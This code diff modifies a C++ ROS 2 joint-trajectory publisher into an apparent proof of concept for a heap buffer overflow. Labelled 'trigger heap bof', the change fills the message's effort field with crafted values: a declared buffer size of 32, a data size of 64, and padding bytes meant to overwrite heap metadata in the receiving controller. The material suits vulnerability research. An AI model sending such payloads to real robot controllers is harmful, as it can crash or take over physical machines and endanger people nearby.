@@ -43,8 +43,7 @@ int main(int argc, char ** argv)
   trajectory_msgs::msg::JointTrajectoryPoint trajectory_point_msg;
   trajectory_point_msg.positions.resize(chain.getNrOfJoints());
   trajectory_point_msg.velocities.resize(chain.getNrOfJoints());
-  trajectory_point_msg.effort.resize(80);
-  
+
   double total_time = 3.0;
   int trajectory_len = 200;
   int loop_rate = static_cast<int>(std::round(trajectory_len / total_time));
@@ -67,22 +66,21 @@ int main(int argc, char ** argv)
 
     joint_positions.data += joint_velocities.data * dt;
 
-    if (i == 0) {
-      trajectory_point_msg.effort[0] = 32.0;
-      trajectory_point_msg.effort[1] = 64.0;
+    // trigger heap bof
+    if (i >= 50) {
+      trajectory_point_msg.effort.resize(80);
+      trajectory_point_msg.effort[0] = 32.0; // buffer size 32
+      trajectory_point_msg.effort[1] = 64.0; // data size 64
       
       for (int j = 2; j < 66; j++) {
         trajectory_point_msg.effort[j] = 67.0; // 'C'
       }
       
-      // should corrupt heap metadata
       for (int j = 66; j < 80; j++) {
         trajectory_point_msg.effort[j] = 68.0;  // 'D'
       }
     } else {
-      for (int j = 0; j < 80; j++) {
-        trajectory_point_msg.effort[j] = 0.0;
-      }
+      trajectory_point_msg.effort.clear();
     }
 
     trajectory_point_msg.time_from_start.sec = i / loop_rate;
